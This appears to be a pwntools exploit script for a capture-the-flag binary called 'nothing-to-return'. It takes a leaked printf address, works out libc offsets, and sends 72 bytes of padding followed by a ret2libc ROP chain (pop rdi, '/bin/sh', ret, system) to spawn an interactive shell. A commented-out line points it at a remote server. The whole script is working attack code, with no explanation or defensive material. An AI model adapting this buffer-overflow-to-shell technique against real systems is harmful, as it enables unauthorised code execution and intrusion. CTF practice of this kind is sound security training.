from pwn import *

io = process("./nothing-to-return")
# io = gdb.debug("./nothing-to-return", '''
# b *0x4012d5
# b *0x00000000004012fb
# c
# ''')
# io = remote("34.30.126.104", 5000)
context.log_level = 'debug'
leak = io.recvline()[13:]
leak = leak.decode()
leak = int(leak, 16)
print("Printf: ", hex(leak))
io.recvuntil("ze:\n")
io.sendline("108")
leak = leak - 0x056250
system = leak + 0x04f760
binsh = leak + 0x19fe34
ret = 0x000000000040101a
pop_rdi = leak + 0x0000000000028265
payload = b'a'*72
print("System: ", hex(system))
print("Binsh: ", hex(binsh))
print("pop_rdi: ", hex(pop_rdi))
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system)
io.recvuntil("input:\n")
io.sendline(payload)
io.interactive()

